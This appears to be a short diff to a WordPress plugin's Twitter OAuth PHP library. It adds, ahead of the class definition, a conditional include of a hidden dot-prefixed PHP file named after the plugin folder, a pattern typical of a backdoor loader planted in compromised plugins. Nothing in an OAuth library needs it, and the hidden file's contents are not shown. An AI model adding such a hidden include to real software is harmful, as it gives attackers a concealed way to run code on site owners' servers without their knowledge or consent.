@@ -12,6 +12,10 @@ require_once('OAuth.php');
 /**
  * Twitter OAuth class
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class TwitterOAuth {
   /* Contains the last HTTP status code returned. */
   public $http_code;
